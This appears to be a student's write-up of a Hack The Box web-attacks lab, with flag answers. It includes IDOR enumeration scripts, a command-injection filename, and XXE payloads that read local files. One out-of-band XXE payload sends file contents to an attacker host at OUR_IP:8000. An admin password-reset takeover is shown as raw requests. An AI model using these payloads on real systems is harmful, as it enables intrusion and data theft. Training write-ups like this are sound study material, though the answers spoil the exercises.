# Bypassing Basic Authentication

1.  Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.

Answer: HTB{4lw4y5_c0v3r_4ll_v3rb5}

Explanation: Simple change the HTTP Verb

# Bypassing Security Filters

1. To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./

Answer: HTB{b3_v3rb_c0n51573n7}

# Mass IDOR Enumeration

1. Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.

Answer: HTB{4ll_f1l35_4r3_m1n3}

The code: 

#!/bin/bash

url="http://94.237.54.116:59987/"

for i in {1..20}; do
    for link in $(curl -s -X POST -d "uid=$i" "$url/documents.php" | grep -oP "\/documents.*?\\.\\w+"); do
        curl -O $url/$link
    done
done

# Bypassing Encoded References

Answer: HTB{h45h1n6_1d5_w0n7_570p_m3}

#!/bin/bash

url="http://94.237.50.242:47361/download.php?contract="

for i in {1..20}; do
    for encodedid in $(echo -n $i | base64); do
        curl  "$url$encodedid" 
    done
done

# IDOR in Insecure APIs

1. Try to read the details of the user with 'uid=5'. What is their 'uuid' value?

Explanation: Using the Burp proxy, there is a need to change the HTTP verb from POST to GET. And after that change the profile id in the url path to 5.

# Chaining IDOR Vulnerabilities

1. Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.

Answer: HTB{1_4m_4n_1d0r_m4573r}

Explanation: Send the request to Intruder in Burp Suite and then take a profile from 0 to 50, the 10th response in API got the role=staff_admin.
Then, send the request with PUT method with data used from the Intruder Response. See the flag.


IDOR Prevention:
IDOR caused by the improper access control on the back-end servers. 
1. Object-level access control
2. Secure references for the objects. 

# Local File Disclosure
1.  Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.

Answer: UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg

Explanation: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">]>
<root>
<name>Dana</name>
<tel>7780052000</tel>
<email>&company;</email>
<message>I feel this</message>
</root>
```
# Advanced File Disclosure
1. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').

Answer: HTB{3rr0r5_c4n_l34k_d474}

Explnation: 

echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///flag.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```
<email>&joined;</email>

# Blind Data Exfiltration

1. Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.

Answer: HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}

Explanation: As this is XXE Blind Vulnerability, now the answer shouold be shown in open server on localhost. 
First, create the xml DTD file:

"""
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<file>.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
"""

and then, to decode the shown content that will be in the open server output:
 
php file: index.php

```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?> 
```

php -S 0.0.0.0:8000

The XXE xml payload:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
# Skill Assessment

1. First, there is an api path: GET /api.php/user/74 that is authenticated with given credentials. 
2. with request id 52 the response is {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
3. Request the /api.php/token/52 - Response: 
{"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
4. Request to change the password of the Administrator

PUT /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne HTTP/1.1
Host: 94.237.59.180:54333
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.180:54333/settings.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: http://94.237.59.180:54333
DNT: 1
Connection: close
Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=74
Sec-GPC: 1

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=anne

5. Login to admin account

6. Request to retrieve the flag with XXE payload:

POST /addEvent.php HTTP/1.1
Host: 94.237.59.180:54333
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.59.180:54333/event.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 302
Origin: http://94.237.59.180:54333
DNT: 1
Connection: close
Cookie: PHPSESSID=urdfe2mq9af4tjigd118sksob5; uid=52
Sec-GPC: 1
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
            <root>
            <name>&Test;</name>
            <details>qwerqwer</details>
            <date>2025-02-20</date>
            </root>
```
Answer: HTB{m4573r_w3b_4774ck3r}